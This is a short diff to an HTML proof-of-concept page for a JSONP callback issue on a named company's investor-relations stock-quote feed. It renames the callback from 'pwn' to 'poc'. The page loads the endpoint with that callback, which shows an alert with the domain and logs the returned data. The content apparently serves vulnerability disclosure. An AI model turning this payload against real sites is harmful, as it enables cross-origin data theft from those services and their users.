@@ -6,11 +6,11 @@
 <body>
   <h3>PoC: alert(document.domain)</h3>
   <script>
-    function pwn(data) {
+    function poc(data) {
       alert("Domain: " + document.domain);
       console.log("Data:", data);
     }
   </script>
-  <script src="https://ir.hertz.com/feed/StockQuote.svc/GetStockQuoteHistoricalList?callback=pwn&exchange=XNAS&symbol=HTZ&pageSize=-1&startDate=Sep-01-2023&endDate=Sep-01-2023"></script>
+  <script src="https://ir.hertz.com/feed/StockQuote.svc/GetStockQuoteHistoricalList?callback=poc&exchange=XNAS&symbol=HTZ&pageSize=-1&startDate=Sep-01-2023&endDate=Sep-01-2023"></script>
 </body>
 </html>
